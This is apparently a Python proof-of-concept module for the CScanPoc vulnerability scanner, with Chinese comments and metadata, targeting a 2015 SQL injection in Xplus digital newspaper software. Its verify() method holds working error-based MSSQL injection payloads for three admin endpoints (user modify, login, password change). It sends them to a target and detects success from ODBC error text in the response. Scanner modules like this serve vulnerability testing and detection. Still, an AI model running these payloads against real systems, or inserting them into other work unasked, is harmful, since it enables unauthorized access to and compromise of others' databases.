# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Xplus_0002'  # 平台漏洞编号，留空
    name = 'Xplus数字报纸通用型post注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-12-17'  # 漏洞公布时间
    desc = '''
        喜阅传媒（Xplus）新数通盛世科技数字报纸多处通用型注入漏洞：
        /www/index.php?mod=admin&con=user&act=modifyDo
        /www/index.php?mod=admin&con=index&act=logindo
        /www/index.php?mod=admin&con=adminuser&act=mypwdpost
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=151537'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Xplus'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '25817cdc-3f44-46cc-a1b2-459d85f76f00'
    author = '国光'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            ps = [
                ['/www/index.php?mod=admin&con=user&act=modifyDo',
                    'userId=-1%20and%20(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20)>0--&realName=111111&userMail=1111111111@qq.com&userTel=13909090099&userAge=age_b&checkMail=1&userStatus=1'],
                ['/www/index.php?mod=admin&con=index&act=logindo',
                    'password=111111&vcode=11111&=11111&username=8111\'%20and%20(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20)>0--'],
                ['/www/index.php?mod=admin&con=adminuser&act=mypwdpost',
                    'mypwd%5BadminOld%5D=111111&mypwd%5BadminPwd%5D=111111&pwd2=111111&id=11111%20and%20(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20)>0--&adminuser_submit=%CC%E1%BD%BB']
            ]
            for p, d in ps:
                url = arg + p
                code2, head, res, errcode, _ = hh.http(url, d)
                # print res
                if (code2 == 200) and ('ODBC SQL Server Driver' in res) and ('SQLExecute' in res) and ('GAO JI' in res):
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
